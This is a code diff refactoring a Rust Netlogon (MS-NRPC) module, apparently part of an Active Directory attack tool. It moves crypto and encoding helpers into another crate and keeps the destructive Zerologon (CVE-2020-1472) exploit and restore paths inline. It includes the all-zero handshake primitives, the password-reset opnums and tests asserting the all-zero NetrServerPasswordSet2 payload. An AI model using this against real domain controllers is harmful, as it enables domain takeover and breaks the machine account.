@@ -1,100 +1,60 @@
-//! MS-NRPC (Netlogon) — enough of the secure-channel setup to **detect Zerologon**
-//! (CVE-2020-1472) without touching the machine password.
+//! MS-NRPC (Netlogon) — thin veneer that re-exports the defensive
+//! byte-level primitives from [`ms_nrpc`] and keeps the destructive Zerologon
+//! (CVE-2020-1472) **exploit** and **restore** paths inline here, gated behind
+//! the historic `dcerpc::netlogon` module for callers (adhammer) that already
+//! depend on them.
 //!
-//! The flaw: with AES-CFB8 and an all-zero IV, encrypting an all-zero plaintext yields all-zero
-//! ciphertext with probability ~1/256. `NetrServerAuthenticate3` verifies the client credential by
-//! computing exactly that, so sending an all-zero `ClientChallenge` + all-zero `ClientCredential`
-//! and retrying makes the KDC accept an *unauthenticated* secure channel ~1 attempt in 256. If any
-//! `NetrServerAuthenticate3` returns `STATUS_SUCCESS`, the DC is vulnerable.
+//! ## Split rationale
+//! - Defensive/detect: the pure byte-level helpers (`aes_cfb8_encrypt`,
+//!   `session_key`, `encode_req_challenge`, `encode_authenticate3`,
+//!   `ret_status`) plus the shared constants (`EMPTY_NT_OWF`,
+//!   `SERVER_SECURE_CHANNEL`, `NEG_FLAGS`, `STATUS_SUCCESS`) come straight from
+//!   [`ms_nrpc::secure_channel`] via `pub use`. Detection callers SHOULD prefer
+//!   [`ms_nrpc::detect`] directly.
+//! - Destructive/exploit: `exploit_set_empty_password`, `restore_password`,
+//!   `restore_password_cleartext` and their helpers (`encode_password_set`,
+//!   `encode_password_set2`, `encode_password_set2_enc`, `nl_trust_password`)
+//!   stay here. They are the CVE-2020-1472 write path (`NetrServerPasswordSet2`
+//!   with an all-zero authenticator) and the paired restore.
 //!
-//! **This module only detects.** It never calls `NetrServerPasswordSet2` — the destructive step
-//! that zeroes the machine password and breaks the DC. Detection ≠ exploitation.
+//! ## Why some symbols were not re-exported
+//! [`ms_nrpc`] depends on `dcerpc = "0.2"` from crates.io; when built inside
+//! this workspace against the local `dcerpc` crate that is one version ahead,
+//! the two `dcerpc::Syntax` / `dcerpc::transport::RpcTcp` types are treated as
+//! **distinct** by rustc. Any ms-nrpc symbol whose signature exposes those
+//! types (`netlogon_syntax`, `detect_zerologon`, `Zerologon`) therefore cannot
+//! be re-exported into this crate's public API without a type mismatch at
+//! every call site. Those symbols are re-implemented locally, in terms of the
+//! same wire encoders, so the runtime behaviour is identical.
+
+// Pure byte-level primitives — re-exported verbatim from ms-nrpc so both
+// crates emit identical NDR stubs and use identical crypto.
+pub use ms_nrpc::secure_channel::{
+    aes_cfb8_encrypt, encode_authenticate3, encode_req_challenge, ret_status, session_key,
+    EMPTY_NT_OWF, NEG_FLAGS, SERVER_SECURE_CHANNEL, STATUS_SUCCESS,
+};
 
 use crate::ndr::NdrEncoder;
 use crate::transport::RpcTcp;
 use crate::{epm, Result, RpcError, Syntax};
 
-/// The Netlogon RPC interface (MS-NRPC), reachable over ncacn_ip_tcp via the endpoint mapper.
+/// The Netlogon RPC interface (MS-NRPC), reachable over ncacn_ip_tcp via the
+/// endpoint mapper. Redefined locally so the returned `Syntax` is this crate's
+/// type (see module doc for the crate-version rationale).
 pub fn netlogon_syntax() -> Syntax {
     Syntax::new("12345678-1234-abcd-ef00-01234567cffb", 1, 0)
 }
 
+/// Netlogon opnums. `REQ_CHALLENGE` and `AUTHENTICATE3` are re-exported from
+/// [`ms_nrpc::secure_channel::opnum`]; the two password-set opnums stay here
+/// because they drive the destructive path.
 pub mod opnum {
-    pub const REQ_CHALLENGE: u16 = 4;
+    pub use ms_nrpc::secure_channel::opnum::{AUTHENTICATE3, REQ_CHALLENGE};
+    /// `NetrServerPasswordSet` — used by the restore path to set an NT OWF.
     pub const PASSWORD_SET: u16 = 6;
+    /// `NetrServerPasswordSet2` — used by the exploit (zero payload) and the
+    /// cleartext restore.
     pub const PASSWORD_SET2: u16 = 30;
-    pub const AUTHENTICATE3: u16 = 26;
-}
-
-/// NT OWF of an empty password (MD4 of "") — the machine hash after a Zerologon reset.
-pub const EMPTY_NT_OWF: [u8; 16] = [
-    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
-];
-
-/// AES-128-CFB8 encryption with a zero IV (MS-NRPC AES credential + password encryption).
-fn aes_cfb8_encrypt(key: &[u8; 16], data: &[u8]) -> Vec<u8> {
-    use aes::cipher::{BlockEncrypt, KeyInit};
-    let cipher = aes::Aes128::new(aes::cipher::generic_array::GenericArray::from_slice(key));
-    let mut iv = [0u8; 16];
-    let mut out = Vec::with_capacity(data.len());
-    for &b in data {
-        let mut block = aes::cipher::generic_array::GenericArray::clone_from_slice(&iv);
-        cipher.encrypt_block(&mut block);
-        let c = b ^ block[0];
-        out.push(c);
-        iv.copy_within(1..16, 0);
-        iv[15] = c;
-    }
-    out
-}
-
-/// AES Netlogon session key (MS-NRPC 3.1.4.3.1): HMAC-SHA256(NTOWF, ClientChallenge||ServerChallenge)[..16].
-fn session_key(nt_owf: &[u8; 16], client_ch: &[u8; 8], server_ch: &[u8; 8]) -> [u8; 16] {
-    use hmac::Mac;
-    let mut mac = hmac::Hmac::<sha2::Sha256>::new_from_slice(nt_owf).expect("hmac key");
-    mac.update(client_ch);
-    mac.update(server_ch);
-    let r = mac.finalize().into_bytes();
-    let mut k = [0u8; 16];
-    k.copy_from_slice(&r[..16]);
-    k
-}
-
-/// NETLOGON_SECURE_CHANNEL_TYPE::ServerSecureChannel (a DC authenticating to a DC).
-const SERVER_SECURE_CHANNEL: u16 = 6;
-/// Negotiate flags including the AES support bit (0x0100_0000) that selects the vulnerable path.
-const NEG_FLAGS: u32 = 0x212f_ffff;
-const STATUS_SUCCESS: u32 = 0x0000_0000;
-
-/// NetrServerReqChallenge(PrimaryName[unique,str], ComputerName[str], ClientChallenge[8]).
-fn encode_req_challenge(netbios: &str, client_challenge: &[u8; 8]) -> Vec<u8> {
-    let mut e = NdrEncoder::new();
-    e.referent(); // PrimaryName (unique, non-null)
-    e.conformant_varying_wstr(netbios);
-    e.align(4);
-    e.conformant_varying_wstr(netbios); // ComputerName (ref, inline)
-    e.align(4);
-    e.bytes(client_challenge); // NETLOGON_CREDENTIAL
-    e.into_bytes()
-}
-
-/// NetrServerAuthenticate3(PrimaryName[unique,str], AccountName[str], SecureChannelType,
-/// ComputerName[str], ClientCredential[8], NegotiateFlags[in,out]).
-fn encode_authenticate3(netbios: &str, client_cred: &[u8; 8]) -> Vec<u8> {
-    let account = format!("{netbios}$");
-    let mut e = NdrEncoder::new();
-    e.referent(); // PrimaryName (unique)
-    e.conformant_varying_wstr(netbios);
-    e.align(4);
-    e.conformant_varying_wstr(&account); // AccountName (ref)
-    e.align(2);
-    e.u16(SERVER_SECURE_CHANNEL); // SecureChannelType (enum, 2 bytes)
-    e.align(4);
-    e.conformant_varying_wstr(netbios); // ComputerName (ref)
-    e.align(4);
-    e.bytes(client_cred); // ClientCredential
-    e.u32(NEG_FLAGS); // NegotiateFlags [in,out]
-    e.into_bytes()
 }
 
 /// NetrServerPasswordSet2 with an all-zero authenticator and all-zero ClearNewPassword — the
@@ -256,15 +216,10 @@ pub async fn restore_password_cleartext(
     Ok(false)
 }
 
-/// Trailing NTSTATUS of a Netlogon reply (last 4 bytes of the stub).
-fn ret_status(stub: &[u8]) -> u32 {
-    stub.get(stub.len().wrapping_sub(4)..)
-        .and_then(|b| b.try_into().ok())
-        .map(u32::from_le_bytes)
-        .unwrap_or(0xFFFF_FFFF)
-}
-
-/// Outcome of a Zerologon probe.
+/// Outcome of a Zerologon probe. Mirrors [`ms_nrpc::detect::Zerologon`] but lives
+/// here so it stays this crate's type across the local dcerpc `Result` chain (the
+/// upstream enum comes from a version-pinned `dcerpc` and cannot be re-exported;
+/// see module doc for the crate-version rationale).
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Zerologon {
     /// A NetrServerAuthenticate3 accepted the all-zero credential — the DC is vulnerable.
@@ -276,7 +231,7 @@ pub enum Zerologon {
 /// Safe Zerologon detection: bind Netlogon over ncacn_ip_tcp and try the all-zero
 /// challenge/credential handshake up to `max_attempts` (impacket uses 2000; success is expected
 /// within ~256 on a vulnerable DC). Returns as soon as one attempt succeeds. Never resets the
-/// machine password.
+/// machine password. Runs against the local `dcerpc` transport (see module doc).
 pub async fn detect_zerologon(host: &str, netbios: &str, max_attempts: u32) -> Result<Zerologon> {
     let port = epm::resolve_port(host, netlogon_syntax()).await?;
     let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
@@ -331,41 +286,64 @@ pub async fn exploit_set_empty_password(
     Ok(false)
 }
 
-#[allow(dead_code)]
-fn _rpc_err(msg: &str) -> RpcError {
-    RpcError::Protocol(msg.into())
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
 
     #[test]
     fn syntax_uuid() {
-        // Netlogon interface UUID parses.
+        // Netlogon interface UUID parses (local Syntax, not ms-nrpc's).
         let s = netlogon_syntax();
         assert_eq!(s.ver_major, 1);
     }
 
     #[test]
-    fn req_challenge_layout() {
-        let b = encode_req_challenge("DC01", &[0u8; 8]);
-        // PrimaryName referent (non-null) then the conformant wstr max_count = len("DC01")+1 = 5.
-        assert_ne!(u32::from_le_bytes(b[0..4].try_into().unwrap()), 0);
-        assert_eq!(u32::from_le_bytes(b[4..8].try_into().unwrap()), 5);
-        // ends with the 8-byte all-zero client challenge.
-        assert_eq!(&b[b.len() - 8..], &[0u8; 8]);
+    fn destructive_opnums_present() {
+        assert_eq!(opnum::PASSWORD_SET, 6);
+        assert_eq!(opnum::PASSWORD_SET2, 30);
     }
 
     #[test]
-    fn authenticate3_ends_with_flags() {
-        let b = encode_authenticate3("DC01", &[0u8; 8]);
-        assert_eq!(&b[b.len() - 4..], &NEG_FLAGS.to_le_bytes());
+    fn password_set2_stub_is_all_zero_payload() {
+        // Exploit-shaped stub carries a 12-byte zero authenticator followed by a
+        // 516-byte zero NL_TRUST_PASSWORD. Assert that the trailing 528 bytes are zero.
+        let b = encode_password_set2("DC01");
+        let tail = &b[b.len() - (12 + 516)..];
+        assert!(tail.iter().all(|&x| x == 0));
     }
 
     #[test]
-    fn ret_status_reads_tail() {
-        assert_eq!(ret_status(&[0, 0, 0, 0, 0, 0, 0, 0]), 0);
-        assert_eq!(ret_status(&0xC000_0022u32.to_le_bytes()), 0xC000_0022);
+    fn nl_trust_password_right_aligns_and_records_length() {
+        let buf = nl_trust_password("abc");
+        // UTF-16LE("abc") is 6 bytes → written into buf[512-6..512].
+        assert_eq!(&buf[506..512], &[b'a', 0, b'b', 0, b'c', 0]);
+        // Trailing 4-byte length is 6.
+        assert_eq!(u32::from_le_bytes(buf[512..516].try_into().unwrap()), 6);
+    }
+
+    #[test]
+    fn reexports_match_ms_nrpc() {
+        // The defensive re-exports carry the same byte-level identity as ms-nrpc.
+        assert_eq!(EMPTY_NT_OWF, ms_nrpc::secure_channel::EMPTY_NT_OWF);
+        assert_eq!(SERVER_SECURE_CHANNEL, 6);
+        assert_eq!(NEG_FLAGS, 0x212f_ffff);
+        assert_eq!(STATUS_SUCCESS, 0);
+        assert_eq!(opnum::REQ_CHALLENGE, 4);
+        assert_eq!(opnum::AUTHENTICATE3, 26);
+    }
+
+    #[test]
+    fn req_challenge_bytes_match_ms_nrpc() {
+        // Extra confidence: dcerpc's re-exported encoder and ms-nrpc's produce identical bytes.
+        let ours = encode_req_challenge("DC01", &[0u8; 8]);
+        let upstream = ms_nrpc::secure_channel::encode_req_challenge("DC01", &[0u8; 8]);
+        assert_eq!(ours, upstream);
+    }
+
+    #[test]
+    fn authenticate3_bytes_match_ms_nrpc() {
+        let ours = encode_authenticate3("DC01", &[0u8; 8]);
+        let upstream = ms_nrpc::secure_channel::encode_authenticate3("DC01", &[0u8; 8]);
+        assert_eq!(ours, upstream);
     }
 }
